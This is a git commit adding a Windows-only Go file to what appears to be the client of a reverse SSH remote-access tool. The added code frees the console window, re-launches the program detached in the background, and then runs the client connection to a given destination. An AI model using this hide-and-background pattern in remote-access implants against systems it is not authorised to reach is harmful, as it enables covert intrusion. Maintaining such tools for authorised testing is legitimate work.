cb100afb7221b47cda4ca096302248f7eb64d77a
Chris Pritchard <chris@grislygrotto.nz>
2021-09-29 19:12:49 +1300

    split os code into its own detach files, reducing duplication

---
+++ cmd/client/detach_windows.go
@@ -0,0 +1,29 @@
+//go:build windows
+// +build windows
+
+package main
+
+import (
+	"log"
+	"os"
+	"os/exec"
+	"syscall"
+
+	"github.com/NHAS/reverse_ssh/internal/client"
+)
+
+func runOrFork(destination, fingerprint, proxyaddress string, fg, dt, rc bool) {
+	if fg || dt {
+		if dt {
+			modkernel32 := syscall.NewLazyDLL("kernel32.dll")
+			procAttachConsole := modkernel32.NewProc("FreeConsole")
+			syscall.Syscall(procAttachConsole.Addr(), 0, 0, 0, 0)
+		}
+		client.Run(destination, fingerprint, proxyaddress, rc)
+		return
+	}
+
+	cmd := exec.Command(os.Args[0], append([]string{"--detach"}, os.Args[1:]...)...)
+	cmd.Start()
+	log.Println("Ending parent")
+}
